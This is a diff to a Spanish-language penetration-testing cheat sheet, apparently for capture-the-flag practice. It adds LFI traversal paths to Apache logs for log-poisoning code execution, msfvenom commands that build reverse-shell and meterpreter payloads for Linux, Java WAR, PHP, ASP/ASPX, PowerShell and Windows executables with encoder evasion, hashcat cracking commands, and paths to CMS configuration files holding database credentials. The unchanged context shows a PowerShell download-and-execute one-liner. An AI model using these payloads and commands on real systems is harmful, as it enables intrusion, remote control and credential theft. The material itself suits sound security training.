@@ -25,9 +25,16 @@ description: "Enumeración - CheetSheat"
 ### LFI to RCE
 
 apache log
+
 ```
 /.././.././../var/log/apache2/access.log
 ///////////..////////./.././/////////..//////log/apache2/access.log
+/var/log/apache/access.log
+/var/log/apache2/access.log
+/var/log/httpd/access_log
+/var/log/apache/error.log
+/var/log/apache2/error.log
+/var/log/httpd/error_log
 ```
 
 ```
@@ -181,6 +188,11 @@ nc <ip> < <file> <port> (envia el fichero)
 ```
 
 ```
+scp <user>@<ip>:<file> ./
+```
+
+
+```
 wget <url> -O <output>
 ```
 
@@ -211,11 +223,49 @@ powershell IEX(New-Object Net.WebClient).downloadString('<url>')
 
 ## msfvenom
 
-Linux
+#### Linux
 
 ```
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
+```
+
+java WAR
+
+```
+msfvenom -p java/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
+```
+
+PHP
+
+```
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.php
+```
+
+
+#### Windows
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f asp -e x86/shikata_ga_nai -o shell.asp
+msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -o shell.aspx
+```
+
+Powershell
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
+```
+
+64 bits
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
+```
+
+Excluyendo BadChars
+
+```
+msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=<ip> LPORT=<port> EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai
 ```
 
 -----------
@@ -382,7 +432,19 @@ tshark -r overpass2.pcapng -Y "http.request.method == GET or http.request.method
 NTLM
 
 ```
-hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 --force <hash> rockyou.txt
+```
+
+MD5
+
+```
+hashcat -m 1600 -a 0 <hash> rockyou.txt
+```
+
+SHA1
+
+```
+hashcat -m 100 -a 0 <hash> rockyou.txt --force
 ```
 
 -----------
@@ -393,6 +455,7 @@ hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
 - Drupal
 - Joomla
 - Gym
+- ...
 
 Ficheros interesantes
 
@@ -400,4 +463,30 @@ Ficheros interesantes
 CHANGELOG.txt
 README.txt
 robots.txt
+```
+
+```
+WordPress: /var/www/html/wp-config.php
+Joomla: /var/www/configuration.php
+Dolphin CMS: /var/www/html/inc/header.inc.php
+Drupal: /var/www/html/sites/default/settings.php
+Mambo: /var/www/configuration.php
+PHPNuke: /var/www/config.php
+PHPbb: /var/www/config.php
+```
+
+-----------
+
+## Stego
+
+Ver información oculta
+
+```
+steghide info <img>.jpg
+```
+
+Extraer información oculta
+
+```
+steghide extract -sf <img>.jpg
 ```
